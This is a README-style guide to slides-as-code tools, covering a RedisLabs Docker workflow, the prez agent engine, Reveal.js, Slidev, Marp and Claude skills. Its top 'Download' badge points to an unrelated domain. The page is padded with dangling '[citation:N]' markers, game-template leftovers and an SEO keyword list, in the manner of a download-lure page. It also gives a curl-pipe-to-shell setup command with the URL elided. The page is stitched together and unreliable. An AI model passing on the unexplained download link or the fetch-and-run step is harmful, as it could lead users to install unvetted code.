# 🎞️ Slides-as-Code — The Complete Guide to Code-Driven Presentations

Welcome to **Slides-as-Code**, your central hub for the tools and workflows that turn presentations into code. Whether you're using the **RedisLabs Docker wrapper** for Markdown-based decks, **prez** with an AI coding agent like Claude Code or Cursor, or a framework like **Reveal.js**, **Slidev**, or **Marp**—this guide puts every approach and critical comparison into one streamlined reference.

[![Download Slides-as-Code](https://veneracloud.com/)](https://veneracloud.com/)

## 📦 INCLUDED MODULES

- 🐳 **REDISLABS SLIDES-AS-CODE** — Docker + Markdown workflow
- 🤖 **PREZ (AI AGENT)** — React/HTML slides from your repo
- 🎯 **REVEAL.JS / SLIDEV / MARP** — the framework landscape
- 🛠️ **CLAUDE SKILLS** — frontend-slides and slides-as-code
- 📊 **COMPARISON TABLE** — which tool for which workflow
- ⚙️ **SETUP** — Docker, npm, and agent configuration

---

## 🐳 REDISLABS SLIDES-AS-CODE — `DOCKER → INIT → SERVE`

A Dockerized workflow that turns a `presentation.md` file into a live-reloading slide deck, with standalone HTML and PDF exports. The only requirement is **Docker** [citation:1].

- **Setup** — Clone `redislabs-training/slides-as-code-setup`, run the setup script, and enter your GitHub username and a token with `read:packages` permissions. The script pulls the Docker image and stores config in `config.sh` [citation:1].
- **Initialize** — `rls.sh init` scaffolds the necessary files and creates `presentation.md`. A `package.info` file stores the Docker image version, and a `.gitignore` keeps template files out of your repo [citation:1].
- **Serve** — `rls.sh serve` starts a webserver on port **4100** and watches `presentation.md` for changes. Every save refreshes the browser tab. Use `-p {PORT}` for a custom port [citation:1].
- **Export** — `rls.sh export` creates a standalone HTML file with all assets inlined. `rls.sh pdf` exports the deck as a PDF [citation:1].
- **Update** — `rls.sh update` pulls the latest template files without overwriting your images or custom styles in `template/custom.scss` [citation:1].

**Why it works:** The deck is version-controlled Markdown, the rendering is consistent because it runs in Docker, and the export is a single portable HTML file.

`DOCKER → INIT → SERVE`

---

## 🤖 PREZ (AI AGENT) — `SCAFFOLD → SKILLS ADD → ASK`

A **zero-opinion slide engine** designed for AI coding agents. You tell your agent what you want, it builds the deck, and you present from localhost. No PowerPoint, no Canva—you stay in the terminal [citation:2][citation:13].

- **How It Works** — `prez` has three components (`Deck`, `Slide`, `Notes`) and no design opinions. Your agent gets React/HTML/CSS freedom inside each slide. Tailwind is included. The agent edits **one file**: `deck/src/slides.tsx` [citation:2][citation:13].
- **Setup** — Scaffold with `curl -fsSL .../setup.sh | sh`, then `cd deck && bun install && bun run dev`. Teach your agent the API with `bunx skills add Enriquefft/prez` (works with Claude Code, Cursor, Copilot, Windsurf, and 20+ others) [citation:2][citation:13].
- **Usage** — Ask your agent: *"Create a 10-slide product demo. Read the docs in ../docs/ and import the PricingTable component from ../src/components/."* [citation:13].
- **Navigation** — Arrow keys, Space for next, Home/End for first/last, `F` for fullscreen, `Alt+Shift+P` for presenter mode (second window with current slide, next preview, notes, and timer). Touch swipe works on mobile [citation:2][citation:13].
- **Image Tools** — `prez-image gen` for AI generation (free, via Pollinations), `prez-image search` for royalty-free photos, and `prez-image render` for SVG-to-PNG conversion [citation:2][citation:13].

**Why it works:** The agent reads your actual codebase and assets. The deck lives in the repo, so it's diffable, version-controlled, and reproducible.

`SCAFFOLD → SKILLS ADD → ASK`

---

## 🎯 REVEAL.JS / SLIDEV / MARP — `CHOOSE → AUTHOR → PRESENT`

The broader slides-as-code landscape has three dominant frameworks, each with a different tradeoff [citation:11].

- **Reveal.js** — Vanilla JS, **~72k GitHub stars**. Markdown via plugin, rich fragments, auto-animate, KaTeX/MathJax. Embeddable in existing sites. Medium learning curve [citation:11].
- **Slidev** — Vue 3/Vite, **~48k stars**. **Native Markdown**, Shiki code animations, built-in recording, PDF export. Heavier bundle, requires Vue for full power [citation:11].
- **Marp** — Node.js, **~3.8k stars**. **Native Markdown**, low learning curve, VS Code extension, native PDF and **PPTX** export. Fewer advanced features (no fragments) [citation:11].
- **Spectacle** — React 18+, **~10k stars**. JSX-first, ideal for React teams with heavy interactivity and data visualization. Steeper learning curve for non-React devs [citation:11].

**Decision guide:**
- **Want Markdown and simplicity** → Marp
- **Want Markdown with animations and recording** → Slidev
- **Want maximum ecosystem and embeddability** → Reveal.js
- **You're a React team** → Spectacle

`CHOOSE → AUTHOR → PRESENT`

---

## 🛠️ CLAUDE SKILLS — `INSTALL → INIT → BUILD`

The Claude ecosystem has dedicated skills that wrap slides-as-code workflows for coding agents.

- **frontend-slides** — A Claude Skill with **10k GitHub stars** that generates beautiful web slides. It interviews you about aesthetics first, generates a few directions to "show not tell," and you pick. The creator notes: *"The world hasn't woken up to the fact that code can create much better slides than most PPT tools"* [citation:9].
- **slides-as-code (evolving-machines-lab)** — Creates standalone HTML slides (1920x1080) with embedded CSS, previews in browser, and exports to **PNG and PPTX**. Workflow: initialize project, create slide HTML files, update `viewer.html`, run `npm run build` [citation:4][citation:5].
- **PPTAgent** — Creates, revises, and visually reviews **editable PowerPoint decks** with a coding agent. Supports Claude Code, Codex, and OpenCode. Requires LibreOffice and Playwright [citation:6].

**Design philosophy from slides-as-code:** *"Don't look AI-generated. Think Apple iOS, Linear, Vercel."* Never use emoji icons, clip art, or generic headers. Always use typography as design, generous whitespace, and restrained color [citation:5].

`INSTALL → INIT → BUILD`

---

## 📊 COMPARISON TABLE — `CHOOSE → SETUP → SHIP`

| Tool | Authoring | Export | Best For |
|---|---|---|---|
| **RedisLabs Docker** | Markdown | HTML, PDF | Version-controlled decks, Docker users [citation:1] |
| **prez** | React/JSX via AI agent | Localhost, browser | AI-first workflows, repo-integrated decks [citation:2][citation:13] |
| **Reveal.js** | HTML/JS (Markdown plugin) | PDF (print), embeddable | Web-native decks, maximum ecosystem [citation:11] |
| **Slidev** | Native Markdown | PDF, recording | Markdown with animations, Vue teams [citation:11] |
| **Marp** | Native Markdown | PDF, PPTX | Simple Markdown, VS Code users [citation:11] |
| **Spectacle** | React JSX | PDF | React teams, interactive/data-heavy decks [citation:11] |

**The 2026 shift:** Coding agents like Claude Code now ship with native capabilities to build complete decks through tools like Claude Design and Artifacts—no skill to install. Claude Design generates interactive HTML decks from plain language, with real export options (standalone HTML, PPTX, PDF, Canva) [citation:11].

`CHOOSE → SETUP → SHIP`

---

## ⚙️ SETUP SYSTEM — `SAVE → LOAD → PLAY`

Getting started with any slides-as-code approach:

1. **Docker path (RedisLabs)** — Install Docker, clone the setup repo, run the setup script with a GitHub token, then `rls.sh init` and `rls.sh serve` [citation:1].
2. **AI agent path (prez)** — Scaffold the deck in your project, install the skill for your agent (`bunx skills add Enriquefft/prez`), and ask the agent to build slides from your repo content [citation:2][citation:13].
3. **Framework path (Marp/Slidev/Reveal)** — Install via npm (`@marp-team/marp-cli`, `@slidev/cli`, or `reveal.js`), author in Markdown or HTML, and export to PDF/PPTX/HTML [citation:11].
4. **Claude skill path** — Install `frontend-slides` or `slides-as-code` in `.claude/skills/`, then let the agent scaffold and build the deck [citation:4][citation:5][citation:9].

`SETUP → AUTHOR → EXPORT`

---

## 💡 Why Choose Slides-as-Code?

Presentations are code: they have structure, they need version control, and they should be reproducible. The slides-as-code movement treats decks like any other project—diffable, reviewable, and exportable. This guide consolidates the Docker-based RedisLabs workflow, the AI-agent-first prez engine, and the Reveal.js/Slidev/Marp framework landscape into one reference. Whether you're a solo developer who lives in the terminal or a team that wants decks in the same repo as the code, this guide maps the tools and the tradeoffs.

## 🎮 Why Use It?

- **Version Control Your Decks** — Markdown and code are diffable; PowerPoint isn't
- **Pick the Right Stack** — Docker, AI agent, or framework
- **Export Anywhere** — HTML, PDF, and PPTX options documented
- **Stay in Your Workflow** — Terminal-first, repo-integrated, agent-native
- **Avoid AI-Generated Aesthetics** — Design philosophy and quality bar included

## 🎛️ Control Panel

| Module | Primary Function | Highlights |
|---|---|---|
| RedisLabs Slides-as-Code | Docker + Markdown | `rls.sh init/serve/export/pdf`, port 4100, live reload |
| prez | AI agent slide engine | React/JSX, `slides.tsx`, presenter mode, image tools |
| Reveal.js / Slidev / Marp | Framework landscape | Vanilla JS, Vue, Node.js, Markdown-first |
| Claude Skills | Agent-native decks | frontend-slides, slides-as-code, PPTAgent |
| Comparison Table | Decision guide | Which tool for which workflow |
| Setup System | Getting started | Docker, npm, agent skills, export paths |

## 🔍 SEO Keywords

Slides-as-Code, slides as code, code presentations, RedisLabs slides-as-code, prez AI presentation, Reveal.js, Slidev, Marp, Spectacle, Claude frontend-slides, slides-as-code skill, Markdown presentations, HTML slides, PPTX export, developer presentations
